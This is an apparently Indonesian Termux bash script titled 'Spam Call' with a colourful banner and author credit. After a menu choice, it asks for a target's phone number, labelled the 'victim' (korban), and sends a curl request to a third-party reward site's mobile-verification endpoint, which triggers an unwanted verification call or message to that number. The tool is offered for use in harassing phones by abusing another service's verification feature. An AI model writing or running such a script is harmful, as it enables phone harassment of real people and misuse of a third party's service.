#!bin/bash
red='\033[1;31m'
green='\033[1;32m'
yellow='\033[1;33m'
purple='\033[1;34m'
blue='\033[1;35m'
cyan='\033[1;36m'
white='\033[1;37m'
clear
figlet "Isi Nama" | lolcat
read -p "[ Siapa Nama Kamu? ]~> " nama
echo -e $yellow"Selamat Datang $nama"
clear
figlet "Spam Call" | lolcat
echo
echo
echo -e $cyan"[+]------------------------------------[+]"
echo -e $cyan" |  "$white"Author : 3mweCyb3r56               "$cyan" |"
echo -e $cyan" |  "$white"Team   : IndCyX-Termux             "$cyan" |"
echo -e $cyan" |  "$white"Github : github.com/3mweCyb3r56    "$cyan" |"
echo -e $cyan"[+]------------------------------------[+]"
echo
echo
sleep 1
echo -e $cyan"[ Pengguna: $nama ]"
echo -e $yellow"[ Spam Call ]"
echo -e $red"By: 3mweCyb3r56"
echo
echo -e $purple"[1]"$white" Spam Call"
echo -e $purple"[0]"$white" Exit"
echo
echo
sleep 1
echo -e $blue
read -p "[ Pilih Nomor ]~> " pil
if [ $pil = "1" ]
then
sleep 2
echo -e $red"Masukan Nomor Tanpa +62/0 (ex: 821xxxxxxx)"
sleep 2
echo -e $purple
read -p "[ Masukan Nomor Korban ]~> " nomor
sleep 4
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
echo
exit
fi

if [ $pil = "0" ]
then
sleep 1
echo -e $yellow"Terima Kasih Telah Menggunakan Script Saya"
sleep 5
exit
fi
